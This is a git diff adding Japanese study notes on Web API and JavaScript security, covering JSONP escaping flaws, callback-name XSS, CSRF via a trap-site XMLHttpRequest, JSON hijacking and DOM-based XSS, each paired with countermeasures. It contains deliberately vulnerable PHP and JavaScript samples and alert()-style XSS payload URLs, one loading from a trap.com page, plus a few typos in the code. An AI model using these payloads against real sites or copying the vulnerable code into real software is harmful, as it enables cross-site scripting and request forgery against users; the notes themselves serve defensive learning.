@@ -1540,6 +1540,7 @@ if (mb_ereg('^http://example\.jp/', $url)) {
 * URLが`http://example.jp/`で始まっていることを確認
 * 次で説明するHTTPヘッダ・インジェクション攻撃に対して脆弱な場合がある
 
+### valid_check_url
 正しい書き方
 ```
 if (mb_ereg('/Ahttps?://example\.jp/[-_.!~*\'();\/?:@&=+\$,%#a-zA-Z0-9]*\z', $url)) {
@@ -2161,8 +2162,532 @@ Cache-Controlヘッダのキャッシュ方法の種類
 [CDN切り替え作業における、Web版メルカリの個人情報流出の原因につきまして](https://tech.mercari.com/entry/2017/06/22/204500)
 * CDNのプロバイダ切り替えのときに, キャッシュされるべきでない情報がCDNにキャッシュされて他のユーザ情報が表示された
 
-# 代表的なセキュリティ機能
+## Web API実装における脆弱性(第2版)
+## JSONとJSONPの概要
+### JSON
+* JavaScriptのオブジェクトリテラルに従ったデータフォーマット
+* JavaScriptのeval関数で変換できる
+    * 危険なのでJSON.stringify, JSON.parseなどを使う
 
+```
+const obj = { name : "abc", age : 29 }
+const json = JSON.stringify(obj)
+// {"name":"abc","age":29}
+```
+
+```
+const json = '{"name":"abc","age":29}'
+const obj=JSON.parse(json)
+```
+
+### JSONP
+* 同一オリジンポリシーの枠内で異なるオリジンのサーバからデータを取得する方法の一つ
+    * 今はCORSを使う方がよい
+* script要素を用いて外部のJavaScriptを直接実行する
+
+```
+// 動作はするが問題がある(後述)
+<?php
+  $callback = $_GET['callback'];
+  header('Content-Type: text/javascript; charset=utf-8');
+  $json = json_encode(array('time' => date('G:i')));
+  echo "$callback($json);";
+```
+
+```
+<script>
+  function display_time(obj) {
+    const txt = document.createTextNode("time:" + obj.time)
+    const p = document.getElementByID("time")
+    p.appendChild(txt)
+  }
+</script>
+<p id="time"></p>
+<script src="https://sample.com/a.php?callback=display_time"></script>
+```
+
+## JSONエスケープの不備
+JSON文字列生成時のエスケープ処理に不備があるとその文字列を受ける側がJSONPを使っていると不正なJavaScriptの実行につながる可能性
+
+```
+<?php
+  $zip = $_GET['zip'];
+  $json = '{"msg":"not found:' . $zip . '"}';
+  header('Content-Type: text/javascript; charset=utf-8');
+  echo "callback_zip($json);";
+```
+
+```
+// use jQuery
+<script>
+$.ajax({
+  url: "http//sample.com/a.php?zip=" + location.hash.slice(1),
+  dataType: "jsonp",
+  jsonCallback: "callback_zip"
+}).done(function(data) {
+  $('#msg').text(data.msg);
+})
+</script>
+<p id="msg"></p>
+```
+
+攻撃例
+
+```
+http://sample.com/sample.html#1"%2balert(document.domain)%2b"
+```
+
+このURLでアクセスするとajaxの中の文字列は
+
+```
+"http://sample.com/a.php?zip=1"+alert(document.domain)+"
+```
+
+生成されるJSONPは
+
+```
+callback_zip({"msg":"not found:1"+alert(document.domain)+""});
+```
+
+これがscript要素で読み込まれるとJavaScriptとして実行されてalertが実行される
+
+### 対策
+* 文字列連結によるJSONデータ生成をしてはいけない
+* 信頼できるライブラリを用いてJSONを生成する
+* evalを使ってはいけない
+
+上記の例では
+
+```
+  $json = json_encode(array("msg" => "not found:" . $zip));
+```
+
+にすると
+
+```
+callback_zip("msg":'not found:1"+alert(document.domain)+');
+```
+
+となって安全
+
+## JSON直接閲覧によるXSS
+JSONを返すWeb APIをブラウザで直接閲覧させることで攻撃が可能になる場合がある
+
+
+```
+<?php
+  $zip = $_GET['zip'];
+  // header('Content-Type: text/javascript; charset=utf-8');
+  echo json_encode(array("msg" => "not found:" . $zip));
+```
+
+MIMEタイプの指定を忘れているとtext/htmlになってしまう
+
+このAPIに
+
+```
+http://sample.com/a.php?zip=<img+src=1+onerror=alert(document.domain)>
+```
+でアクセスするとalertダイアログが表示される
+
+### 原因
+
+HTTPレスポンス
+
+```
+HTTP/1.1 200 OK
+...
+Content-Type: text/html; charset=utf-8
+...
+***<img src=1 onerror=alert(document.domain)>"}
+```
+
+* MIMEタイプがtext/htmlなのでブラウザがHTMLとして解釈
+* img要素で画像を表示しようとする
+* エラーなのでonerrorイベント発動
+* 代表的なセキュリティ機能
+
+### 対策
+* MIMEタイプを正しくapplication/jsonとしている
+* 古いIE(IE9)がContent-Typeヘッダを無視することがある
+
+* `X-Content-Type-Optins: nosniff`をつけるとIE8, IE9では大丈夫になる
+* (本来不要だが)JSONでも`<`や`>`をUNICODEエスケープするとXSSにはならない
+    * `<` ; \u003c
+    * `>` ; \u003e
+    * `&` ; \u0026
+    * `'` ; \u0029
+    * `"` ; \u0022
+
+* XMLHttpRequestなどのCORS対応の機能だけから呼び出せるようにする
+* jQueryなどはXMLHttpRequestによるHTTPリクエストのヘッダに`Xrequested-With: XMLHttpRequest`を付与する
+    * このヘッダが無いと不正なリクエストとみなしてエラーにできる
+
+## JSONPのコールバック関数名によるXSS
+* JSONPではcallback関数を外部から指定できる場合がある
+* この名前によるXSSが可能になることがある
+
+```
+<?php
+  $callback = $_GET['callback'];
+  $json = json_encode(array('time' => date('G:i')));
+  echo "$callback($json)";
+```
+
+これを
+
+```
+http://sample.com/a.php?callback=%3Cscript%3Ealert(1)%3C/script%3E
+```
+で呼び出すと`<script>alert(1)</script>({"time":"12:34"});`になる
+
+### 問題点
+* 外部から指定されたcallback関数名を検証していない
+    * 関数名の文字種と文字数を制限する
+    * 英数字とアンダースコアのみなど
+* MIMEタイプの指定を忘れている
+
+## Web APIのCSRF
+経路
+* GETリクエストによる攻撃
+    * GETリクエストで副作用を伴う処理をしていると攻撃対象になる
+* 次のタイプでのHTMLフォームによる攻撃
+    * text/plain ; エンコードしていない
+    * application/x-www-form-urlencoded ; 通常のフォーム
+    * multipart/form-data ; ファイルアップロード形式
+
+### クロスオリジン対応のXMLHttpRequestによる攻撃
+* サイト側の許可無しに異なるオリジンからリクエストを送信可能
+* POSTデータの中身は自由に設定可能
+* サーバアプリでMIMEタイプをチェックしていない
+
+```
+// メールアドレスをJSONで返すAPI
+if (empty($_SESSION['mail'])) {
+  $_SESSION['mail'] = 'test@sample.com';
+}
+header('Content-Type: application/json; charset=utf-8');
+echo json_encode(array('mail' => $_SESSION['mail']));
+```
+
+```
+// メールアドレスを変更するAPI change.php
+if (empty($_SESSION['mail'])) {
+  // error
+}
+$json = file_get_contents('php://input');
+$array = json_decode($json, true);
+// セッション変数の更新
+$_SESISON['mail'] = $array['mail'];
+$result = array('result' => 'ok');
+header('Content-Type: application/json; charset=utf-8');
+echo json_encode($result);
+```
+
+罠サイト
+
+```
+<script>
+  const req = new XMLHttpRequest()
+  req.open("POST", "http://sample.com/change.php")
+  req.withCredentials = true // CORS
+  req.send('{"mail': "cracked"}');
+</script>
+```
+
+* CORSを設定しているのでリクエストはできる
+* API側はクロスオリジンの呼び出しを許可していないのでこのHTTPリクエストのレスポンスは参照できない
+* CSRF攻撃自体は成立(change.phpは実行されてメールアドレスが変更される)
+
+## CSRFの攻撃経路
+* HTMLフォームによるもの
+* XMLHttpRequestによるもの
+* 多くのWebアプリがHTTPリクエストのMIMEタイプを検証していない
+
+## 対策
+### CSRF token(セッション変数にtokenを保持)
+* Webページにhiddenパラメータやカスタムデータ属性でtokenを保存してJavaScriptから参照
+    * ログインAPIでtokenが無ければ生成してセッション変数に記憶しtokenをJSONで返す
+    * このAPIはCORSに対応していないので他のオリジンから利用できない
+    * Web APIがそのtokenをチェックする
+
+```
+// メールアドレスをJSONで返すAPI(token生成版)
+if (empty($_SESSION['token'])) {
+  $token = bin2hex(openssl_random_pseudo_bytes(24));
+  $_SESSION['token'] = $token;
+}
+
+header('Content-Type: application/json; charset=utf-8');
+echo json_encode(array(
+  'mail' => $_SESSION['mail'],
+  'token' => $_SESSION['token']
+));
+```
+
+```
+$token = $_SERVER['HTTP_X_CSRF_TOKEN'];
+if (empty($token) || $token !== $_SESSION['token']) {
+  // error
+}
+```
+
+### 二重送信クッキー(Double-submit Cookie)
+* 乱数によるtokenをクッキーとして保持
+* 同じ値をリクエストヘッダのパラメータとしてクッキーと別に送信
+* Web APIでそれらの値が同じであることを確認する
+* OWASPのCSRF Prevention Cheat Sheetでも推奨されている
+  [CSRFの防止策に関するチートシート](https://jpcertcc.github.io/OWASPdocuments/CheatSheets/Cross-SiteRequestForgeryPrevention.html#Double_Submit_Cookies)
+
+問題点
+* クッキーは第三者から強制される可能性がある
+* 攻撃者が適当に生成したtokenをサイト利用者のクッキーに強制して同じ値をtokenパラメータとして送信できる
+* tokenパラメータはHTTPリクエストヘッダを用いることを推奨
+    * プリプライとリクエストが許可されないとクロスオリジン通信でカスタムリクエストヘッダを付与できないので安全
+
+### カスタムリクエストヘッダによる対策
+たとえばjQueryは`X-Requested-With`ヘッダを自動的に付与するのでそれをチェックする
+
+## JSONハイジャック
+* ブラウザのバグによる脆弱性
+* 例 : JSON APIの値をscript要素から呼び出す裏技(昔のFirefoxのバグ)
+```
+// json
+[{"mail":"a@sample.com"}]
+```
+
+```
+// 攻撃ページ
+<body onload="alert(x)">
+<script>
+var x = ""
+Object.prototype.__defineSetter__("mail", function(v) { x += v + " "; });
+</script>
+<script src="sample.com/a.json"></script>
+```
+* a.jsonが読まれて値が設定されるときに__defineSetter__が発動
+* その中身がxに代入されて表示
+
+### 対策(従来の対策とかぶるが安全のため)
+* `X-Content-Type-Options: nosniff`の付与
+* `X-Requested-With: XMLHttpRequest`を確認
+    * script要素からJSON APIを呼び出すとカスタムリクエストヘッダはつけられない
+
+## JSONPの不適切な利用
+* 同一オリジンポリシーの制限を抜けるために作られた手法
+* 使い方を間違えると簡単に脆弱性に直結
+* できるだけCORS対応のAPIに移行すべき
+
+### JSONPによる秘密情報の提供は避ける
+正規サイトと罠サイトからのJSONPの呼び出しヘッダではRefererが異なるのみなのでアクセス制御には不向き
+
+## 信頼できないJSONP APIの仕様
+* API側に悪意があると任意のJavaScriptが呼ばれてしまう
+* API提供元が信用できないと使ってはいけない
+
+## CORSの検証不備
+### オリジンとして"*"を指定する
+* `Access-Control-Allow:Origin: *`
+* 公開情報のみを提供する場合はOK
+* 秘密情報を扱う場合は情報漏洩の危険性
+* オリジンを制限しHTTPリクエストのOriginヘッダを検証するほうがよい
+
+### オリジンのチェックを緩和する
+XMLHttpRequestのwithCredentialsを指定した場合はAccess-Control-Allow-Originに指定するヘッダを明示する必要がある
+
+## 設定した方がよいセキュリティを強化するレスポンスヘッダ
+* `X-Frame-Options`
+    * frameやiframeの内部に表示できない
+    * クリックジャック対策
+* `X-Content-Type-Options: nosniff`
+    * MIMEタイプの解釈を厳密にする
+* `X-XSS-Protection: 1; mode=block`
+    * XSSフィルタを有効にする
+* `Content-Security-Policy`
+    * XSS攻撃を緩和する / 開発コストは大きい
+    * `Content-Security-Policy: default-src 'self'`
+    * すべてのメディアはオリジンからのみ読める
+    * scriptタグの禁止
+* `Strict-Transport-Security: max-age=31536000`
+    * HTTPS接続を強制する ; HTTP Strict Transport Security(HSTS)
+    * httpへのダウングレード攻撃を防ぐ
+
+## JavaScriptの問題(第2版)
+### innerHTMLによるDOM Based XSS
+URLの#以下の部分(フラグメント識別子)に応じて内容を変化させるアプリ
+
+```
+<script>
+window.addEventListner('hashchange', changeHash, false)
+window.addEventListner('load', changeHash, false)
+
+function changeHash() {
+  const hash = decodeURIComponent(window.location.hash.slice(1))
+  const color = document.getElementById('color')
+  color.innerHTML = hash
+}
+</script>
+<a href="#赤">赤</a>
+<a href="#青">青</a>
+<a href="#緑">緑</a>
+```
+
+* `http://sample.com/a.html#赤`で赤に飛ぶ
+* `http://sample.com/a.html#<img src=/ onerror=alert(1)>`で攻撃
+
+innerHTMLでJavaScriptが動く
+
+### document.writeによるDOM Based XSS
+document.write()でもXSS可能
+
+```
+<script>
+const url = decodeURIComponent(location.href)
+document.write('<img src="http://sample.com/a.php?" + url + '">')
+</script>
+```
+
+`http://sample.com/a.html#%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E`で攻撃
+
+### XMLHttpRequestのURL未検証問題
+フラグメントから別のコンテンツを読み込む
+
+```
+const req = new XMLHttpRequest()
+const url = localtion.hash.slice(1) + '.html'
+req.open('GET', url)
+...
+```
+
+```
+// attack.php
+<?php
+  header('Access-Control-Allow-Origin: http://sample.com');
+?><img src=/ onerror=alert(document.domain) >
+```
+
+```
+http://sample.com/a.html#//trap.com/attack.php?
+```
+で攻撃
+
+### jQueryのセレクタ動的生成によるXSS
+* jQuery()関数はHTMLタグ文字列を指定するとDOM要素を生成する
+    * `$('<p>test</p>')`
+    * `$('input[name="' + color + '""]')`
+* 外部からの文字列が混ざると攻撃者が新しい要素を追加できる可能性
+
+```
+<script>
+const uri = new URI()
+let color = uri.query(true).colr
+if (!color) color = 1
+$('input[name="color"][value="' + color + '"]').attr("checked", true)
+</script>
+```
+
+正常パターン
+```
+http://sample.com/a.html?color=2
+```
+
+攻撃
+```
+http://sample.com/a.html?color="]<img+src=/+onerror=alert(1)>
+```
+
+jQuery 3.2.1以降ではセレクタによるDOM Based XSSは防げる
+
+
+### javascript:スキームによるXSS
+location.hrefに任意の文字列を設定できるとXSSの原因となる
+
+```
+<input type="button" value="go" onclick="go()">
+<script>
+function go() {
+  const url = location.hash.slice(1)
+  location.href = url
+}
+</script>
+```
+
+javascript:スキームを設定する
+```
+http://sample.com/a.html#javascript:alert(1)
+```
+
+### 脆弱性が生まれるパターン
+外部入力文字列をそのまま使ってしまう
+* DOM操作でHTMLタグが有効になる
+    * document.write(), document.writeln()
+    * innerHTML, outerHTML
+    * jQueryのhtml(), jQuery(), $()
+* evalを使う
+    * eval()
+    * setTimeout(), setInterval()
+    * Functionコンストラクタ
+* XMLHttpRequestのURLが未検証
+* location.href, a要素のsrc属性, href属性のURLが未検証
+
+### 対策
+
+### 適切なDOM操作
+```
+const color = document.getElementById('color')
+color.innerHTML = decodeURIComponent(window.location.hash.slice(1))
+```
+↓
+```
+color.textContent = decodeURIComponent(window.location.hash.slice(1))
+```
+### 記号のエスケープ
+* document.writeを使わない
+* HTMLエスケープする
+```
+function escape_html(s) {
+  s = s.replace(/&/g, "&amp;")
+  s = s.replace(/</g, "&lt;")
+  s = s.replace(/>/g, "&gt;")
+  s = s.replace(/"/g, "&quot;")
+  s = s.replace(/'/g, "&#39;")
+  return s
+}
+```
+### eval, setTimeout, Functionコンストラクタに外部文字列を渡さない
+```
+const msg = "alert(1)"
+setTimeout(msg, 1000)
+```
+はalert(1)を実行する
+
+### URLのスキームはhttpかhttps限定
+正しい書き方は[オープンリダイレクタのvalid_check_url](#valid_check_url)を参照
+
+### jQueryのセレクタを動的生成しない
+可能ならparseIntなどを利用
+
+### XMLHttpRequestのURL検証
+* 外部からのURLを受け付けない
+* 固定のテーブルから選択させる
+```
+const menuTbl = { a:'a.html', b:'b.html', ... }
+const url = menuTbl[location.hash.slice(1)]
+...
+
+## Webストレージの不適切な利用
+* クッキー ; リクエストごとに自動的にサーバに送信される
+* Webストレージ ; 読み書きのみ可能 サーバには自動的に送信されない
+    * 同一オリジンポリシー
+    * localStorage ; 永続的
+    * sessionStorage ; ブラウザのタブが開かれている間のみ保持される
+    * JavaScriptから常にアクセス可能(httpOnlyがない)
+
+Webストレージに秘密情報は保存しない
+
+
+
+```
 ## 認証
 認証 ; 利用者が本人であることを確認すること
 
